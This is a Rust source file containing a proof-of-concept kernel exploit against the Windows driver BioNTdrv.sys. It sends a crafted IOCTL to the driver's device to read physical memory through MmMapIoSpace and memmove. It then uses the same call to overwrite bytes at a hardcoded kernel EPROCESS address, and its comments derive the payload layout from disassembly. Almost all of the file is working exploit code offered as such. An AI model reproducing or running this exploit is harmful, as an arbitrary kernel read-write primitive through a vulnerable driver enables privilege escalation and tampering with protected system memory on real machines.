use std::{ffi::c_void, iter::once, ptr::null_mut};

use windows_sys::Win32::{
    Foundation::{GENERIC_ALL, GetLastError, INVALID_HANDLE_VALUE},
    Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_SYSTEM, FILE_SHARE_NONE, OPEN_EXISTING},
    System::IO::DeviceIoControl,
};

#[repr(C)]
#[derive(Debug)]
struct Payload {
    physical_address: u32, // rsp       from disas
    count: u32,            // rsp+4     from disas
    dest: u64,             // rsp+8     from disas
}

fn main() {
    println!("[i] Running exploit against BioNTdrv.sys..!");

    let drv_name: Vec<u16> = r"\\.\BioNT_BS".encode_utf16().chain(once(0)).collect();

    let h_device = unsafe {
        CreateFileW(
            drv_name.as_ptr(),
            GENERIC_ALL,
            FILE_SHARE_NONE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_SYSTEM,
            null_mut(),
        )
    };

    if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
        panic!(
            "[-] Could not open handle to driver. Result: {:p}, last error: {:#X}",
            h_device,
            unsafe { GetLastError() }
        );
    }

    //
    // Prepare the payload.
    // 1. we require a physical address to copy memory from (4 bytes) - the disas is as follows:
    // mov     ecx, [rsi]       <------- 4 bytes not 8
    // mov     edx, [rsi+4]    ; NumberOfBytes
    // xor     r8d, r8d        ; CacheType
    // call    cs:MmMapIoSpace
    //
    // 2 Then we need to supply the following, buf+4 = sz, buf+8 is dest to copy to
    // mov     r8d, [rsi+4]    ; MaxCount
    // mov     rdx, rax        ; Src
    // mov     rcx, [rsi+8]    ; Dst
    // call    memmove
    //

    const BUF_SZ: u32 = 8;
    let mut buf = [0u8; BUF_SZ as _];
    let mut payload = Payload {
        physical_address: 0x00100000, // we are limited to a max of 4 bytes cos of the driver, cries in 64-bit
        count: BUF_SZ,
        dest: (&raw mut buf) as u64,
    };

    println!(
        "[i] Sending IOCTL to map physical address into our buffer. Payload configuration: ",
    );

    println!("\tPhysical address to read: {:#X}", payload.physical_address);
    println!("\tNumber of bytes to read: {:#X}", payload.count);
    println!("\tAddress of buffer: {:p}", payload.dest as *const c_void);

    let mut bytes_out = 0;

    let result = unsafe {
        DeviceIoControl(
            h_device,
            2228244,
            &raw mut payload as *const _,
            size_of_val(&payload) as _,
            null_mut(),
            0,
            &raw mut bytes_out,
            null_mut(),
        )
    };

    if result == 0 {
        panic!("[-] Failed to complete IOCTL.");
    }

    println!("Result of physical device memory read primitive:");

    for b in buf {
        print!("0x{b:X}, ");
    }

    println!();

    //
    // Now show how we can modify memory - stupid example as I don't have time to explore anything more with this
    // random svchost.exe EPROCESS start address: ffffaf08349a4080 so lets overwrite it with the value we found
    // in physical memory.
    // So, we will read 0x1, 0x2, 0x3, 0x4, 0x5 from physical memory into the first few bytes of the EPROCESS
    //

    let mut payload = Payload {
        physical_address: 0x00100000, // we are limited to a max of 4 bytes cos of the driver, cries in 64-bit
        count: BUF_SZ,
        dest: 0xffffaf08349a4080,
    };

    let _result = unsafe {
        DeviceIoControl(
            h_device,
            2228244,
            &raw mut payload as *const _,
            size_of_val(&payload) as _,
            null_mut(),
            0,
            &raw mut bytes_out,
            null_mut(),
        )
    };

    println!("[+] Kernel exploit overwrote bytes at address: 0xffffaf08349a4080.");

}
